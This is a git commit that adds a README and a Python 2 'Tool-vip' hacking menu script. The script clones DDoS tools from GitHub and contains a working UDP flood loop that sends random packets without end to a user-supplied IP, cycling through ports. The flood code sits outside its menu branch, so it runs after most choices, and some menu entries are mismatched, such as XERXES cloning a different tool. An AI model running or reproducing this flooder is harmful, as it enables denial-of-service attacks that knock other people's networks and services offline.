f376f90f5253ee279b687fb06baac0fc45e7e679
Hacker-kingdom-TH673 <58379849+Hacker-kingdom-TH673@users.noreply.github.com>
2019-12-22 01:00:10 +0700

    Add files via upload

---
+++ README.md
@@ -0,0 +1,26 @@
+#Ceartor Hacker kingdom TH
+#Script Tool-vip
+
+:Installation Steps
+
+$pkg upgarde
+
+$pkg update
+
+$pkg install python python2
+
+$pkg install git
+
+$pkg install figlet
+
+$pkg install
+
+:Steps Use
+
+$cd Tool-vip
+
+$chmod +X *
+
+$python2 Tool-vip.py
+
+The End
---
+++ Tool-vip.py
@@ -0,0 +1,159 @@
+#hello I Am Hacker kingdom TH
+#Script Tool_vip
+
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+
+os.system("clear")
+os.system("figlet Tool-vip |lolcat")
+print "                                                                           "
+print "                                     Ceartor : Hacker kingdom TH           "
+print "                                     youtube : Hacker kingdom TH           "
+print "                              "
+print "     [01]>[ToolHack]              "
+print "     [02]>[DDOS Attack]          "
+
+A = raw_input("HKDTH=>")
+if  A == "1" or A == "01":
+     
+     print "         [01] hammer "
+     print "         [02] Planetwork-DDOS      " 
+     print "         [03] Scan_sql             "
+     print "         [04] XERXES               "
+     print "         [05] DDOS_ip              "
+     print "         [06] msf                  "
+     print "         [07] metasploit            "
+     print "         [08] LOAD-command   "
+     print "         [00] back to main menu  "
+     Tool = raw_input("HKDTH=>")
+     
+     if Tool == "01" or Tool == "1":
+                        os.system ("clear")
+                        os.system ("apt-get install python python2 ")
+                        os.system ("git clone https://github.com/cyweb/hammer")
+                        os.system ("mv hammer /$HOME")
+                        os.system ("figlet hammer | lolcat")
+                        os.system ("clear")
+                        os.system ("python2 Tool-vip.py")
+                        os.system ("clear")
+                        os.system ("python2 Tool-vip.py")
+     elif Tool == "02" or Tool == "2":
+                        os.system ("clear")
+                        os.system ("apt-get install python python2")
+                        os.system ("git clone https://github.com/Hydra7/Planetwork-DDOS.git")
+                        os.system ("mv Planetwork-DDOS /$HOME")
+                        os.system ("figlet Planetwork-DDOS | lolcat")
+                        os.system ("clear")
+                        os.system ("python2 Tool-vip.py")
+                        
+     elif Tool == "03" or Tool == "3":
+                        os.system ("clear")
+                        os.system ("apt-get install python python2")
+                        os.system ("git clone https://github.com/Hacker-kingdom-TH673/Scan_sql.git")
+                        os.system ("mv Scan_sql /$HOME")
+                        os.system ("figlet Scan_sql | lolcat")
+                        os.system ("clear")
+                        os.system ("python2 Tool-vip.py")
+     elif Tool == "04" or Tool == "4":
+                        os.system ("clear")
+                        os.system ("apt-get install python python2")
+                        os.system ("git clone https://github.com/cyweb/hammer")
+                        os.system ("mv XERXES /$HOME")
+                        os.system ("figlet XERXES | lolcat")
+                        os.system ("clear")
+                        os.system ("python2 Tool-vip.py")
+     elif Tool == "05" or Tool == "5":
+                        os.system ("clear")
+                        os.system ("apt-get install python python2")
+                        os.system ("git clone https://github.com/Hacker-kingdom-TH673/DDOS_IP.git")
+                        os.system ("mv DDOS_ip /$HOME")
+                        os.system ("figlet DDOS ip | lolcat")
+                        os.system ("clear")
+                        os.system ("python2 Tool-vip.py")
+     elif Tool == "06" or Tool == "6":
+                        os.system ("clear")
+                        os.system ("apt-get install python python2")
+                        os.system ("git clone https://github.com/Hacker-kingdom-TH673/msf.git")
+                        os.system ("mv msf /$HOME")
+                        os.system ("figlet msf | lolcat")
+                        os.system ("clear")
+                        os.system ("python2 Tool-vip.py")
+     elif Tool == "07" or Tool == "7":
+                        os.system ("clear")
+                        os.system ("apt-get install python python2")
+                        os.system ("git clone https://github.com/Hacker-kingdom-TH673/metasploit.git")
+                        os.system ("mv metasploit /$HOME")
+                        os.system ("figlet metasploit | lolcat")
+                        os.system ("clear")
+                        os.system ("python2 Tool-vip.py")
+     elif Tool == "08" or Tool == "8":
+                    os.system ("clear")
+                    os.system ("apt-get install python python2")
+                    os.system ("git clone https://github.com/Hacker-kingdom-TH673/LOAD-command")
+                    os.system ("mv LOAD-command /$HOME")
+                    os.system ("figlet LOAD-command | lolcat")
+                    os.system ("clear")
+                    os.system ("python2 Tool-vip.py")
+     elif Tool == "00" or Tool == "0":
+                        os.system ("python2 Tool-vip.py")
+     else:
+                        print "\nERROR: Wrong Input"
+                        os.system ("python2 TOOLWARE.py")
+if A == "0" or A == "00":
+    os.system ("pkg install neofetch")
+    os.system ("clear")
+    os.system ("neofetch")
+    print "\033[1m\033[32m Python Programing By Hacker kingdom TH"
+    os.system ("cd")
+
+if A == "2" or A == "02":
+    os.system ("clear")
+    os.system ("figlet DDos Attack !!")
+    print
+    print "\033[1m\033[32m Python Programing By Hacker kingdom TH"
+    print
+    print "\033[0m"
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet DDOS ip | lolcat ")
+print
+print "\033[1m\033[32m Python Programing By Hacker kingdom TH"
+ip = raw_input("IP target@ : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("figlet Attack !! | lolcat")
+
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s Attack  port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+
+if A == "0" or A == "00":
+    os.system ("pkg install neofetch")
+    os.system ("clear")
+    os.system ("neofetch")
+    print "\033[1m\033[32m Python Programing By Hacker kingdom TH"
+    os.system ("cd")
+    
